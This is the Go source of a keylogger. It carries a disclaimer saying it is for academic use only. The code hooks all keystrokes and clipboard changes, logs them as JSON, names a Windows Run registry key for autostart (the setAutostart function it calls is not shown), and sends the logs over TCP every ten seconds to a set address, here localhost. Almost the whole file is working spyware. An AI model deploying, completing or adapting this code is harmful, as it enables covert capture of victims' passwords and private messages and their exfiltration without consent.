// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for academic usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

//go:build windows || linux

package main

import (
	"encoding/json"
	"fmt"
	"github.com/atotto/clipboard"
	hook "github.com/robotn/gohook"
	"net"
	"os"
	"os/signal"
	"time"
)

// KeyType is the alias of string
type KeyType string

const (
	Protocol = "tcp"
	Address  = "127.0.0.1:8722"

	KeyName = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	AppName = "Keylogger"

	TypeKeyboard  KeyType = "KBD"
	TypeClipboard KeyType = "CBD"
	TypeSpecial   KeyType = "SPC"

	Interval = 10 * time.Second
)

type keyLog struct {
	Time  int64   `json:"time"`
	Type  KeyType `json:"type"`
	Value string  `json:"value"`
}

func newKeyLog(keyType KeyType, value string) keyLog {
	return keyLog{
		Time:  time.Now().UnixMilli(),
		Type:  keyType,
		Value: value,
	}
}

var keyLogs []keyLog
var ticker = time.NewTicker(Interval)

func main() {
	// Register autostart service.
	setAutostart()
	// Start a goroutine to listen clipboard.
	go listenClipboard()
	// Start a goroutine to listen keyboard.
	go listenKeyboard()
	// Start a goroutine to send logs.
	go autoSend()
	// Make a channel for receiving system signal.
	c := make(chan os.Signal)
	// Detect interrupt (ctrl+C) signal.
	signal.Notify(c, os.Interrupt)
	// Block until received interrupt signal.
	select {
	case <-c:
		// Send the residual logs.
		if len(keyLogs) > 0 {
			sendLogs()
		}
	}
}

// listenClipboard listens and logs changes of clipboard.
func listenClipboard() {
	var text string
	for {
		// Read from clipboard.
		t, _ := clipboard.ReadAll()
		// If the clipboard is nonempty string or has been changed, log it and reset ticker.
		if t != text && t != "" {
			text = t
			keyLogs = append(keyLogs, newKeyLog(TypeClipboard, text))
			ticker.Reset(Interval)
		}
	}
}

// listenKeyboard listens and logs the events of keyboard.
func listenKeyboard() {
	evChan := hook.Start()
	defer hook.End()
	for ev := range evChan {
		// hook.Start() listens events including mouse and keyboard actions. Only character keys (letters, numbers,
		// symbols, space, enter, etc.) will call the hook.KeyDown event, others (ctrl, alt, f1, etc.) will not. Thus,
		// if detected characters typed, log it and reset ticker.
		if ev.Kind == hook.KeyDown {
			// Treat return (\r, enter on keyboard), backspace (\b), and tab (\t) as special keys.
			switch ev.Keychar {
			case '\r':
				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "enter"))
			case '\b':
				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "backspace"))
			case '\t':
				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "tab"))
			case rune(27):
				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "escape"))
			default:
				// When nothing logged or the last recorded character is not TypeKeyboard, append a new logKey object
				// directly. If it has recorded and the last recorded type is also TypeKeyboard, append the character to
				// the Value field of the last object.
				if len(keyLogs) == 0 {
					keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, fmt.Sprintf("%c", ev.Keychar)))
				} else {
					if keyLogs[len(keyLogs)-1].Type == TypeKeyboard {
						keyLogs[len(keyLogs)-1].Value += fmt.Sprintf("%c", ev.Keychar)
					} else {
						keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, fmt.Sprintf("%c", ev.Keychar)))
					}
				}
			}
			ticker.Reset(Interval)
		}
	}
}

// autoSend detects signal from the ticker, then send logs to the target server.
func autoSend() {
	for {
		select {
		// When there is no operation for a specific time interval, send logs.
		case <-ticker.C:
			// Send nonempty logs only.
			if len(keyLogs) > 0 {
				sendLogs()
			}
			ticker.Reset(Interval)
		}
	}
}

// sendLogs sends keyLogs to the target server via TCP.
func sendLogs() {
	// Create TCP end point for dialing.
	laddr, _ := net.ResolveTCPAddr(Protocol, Address)
	// Dial to connect to the server.
	conn, err := net.DialTCP(Protocol, nil, laddr)
	if err != nil {
		return
	}
	defer conn.Close()
	// Serialise keyLog slice to JSON.
	bytes, _ := json.Marshal(keyLogs)
	// Send logs to the target server.
	_, err = conn.Write(bytes)
	fmt.Println(string(bytes))
	if err != nil {
		fmt.Println(err.Error())
	}
	// Clear the keyLog slice.
	keyLogs = []keyLog{}
}
